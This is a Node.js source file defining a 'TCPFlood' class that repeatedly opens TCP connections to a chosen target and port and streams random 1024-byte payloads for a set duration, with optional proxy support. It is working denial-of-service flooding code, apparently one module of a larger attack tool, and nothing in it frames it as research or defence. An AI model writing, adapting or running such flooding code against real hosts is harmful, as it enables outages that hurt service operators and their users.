import net from 'net';
import { Tools } from '../../utils/tools.js';
import { logger } from '../../utils/logger.js';

/**
 * TCP Flood Attack
 */
export class TCPFlood {
    constructor(target, port, duration, proxies = null) {
        this.target = target;
        this.port = port;
        this.duration = duration;
        this.proxies = proxies;
        this.active = true;
    }

    async start() {
        const endTime = Date.now() + (this.duration * 1000);

        while (Date.now() < endTime && this.active) {
            await this.attack();
        }
    }

    async attack() {
        return new Promise((resolve) => {
            const socket = new net.Socket();
            
            socket.setTimeout(900);

            socket.connect(this.port, this.target, () => {
                const sendData = () => {
                    if (!this.active) {
                        Tools.safeClose(socket);
                        resolve();
                        return;
                    }

                    const payload = Tools.randomBytesBuffer(1024);
                    const sent = Tools.send(socket, payload);
                    
                    if (sent) {
                        setImmediate(sendData);
                    } else {
                        Tools.safeClose(socket);
                        resolve();
                    }
                };

                sendData();
            });

            socket.on('error', () => {
                Tools.safeClose(socket);
                resolve();
            });

            socket.on('timeout', () => {
                Tools.safeClose(socket);
                resolve();
            });
        });
    }

    stop() {
        this.active = false;
    }
}
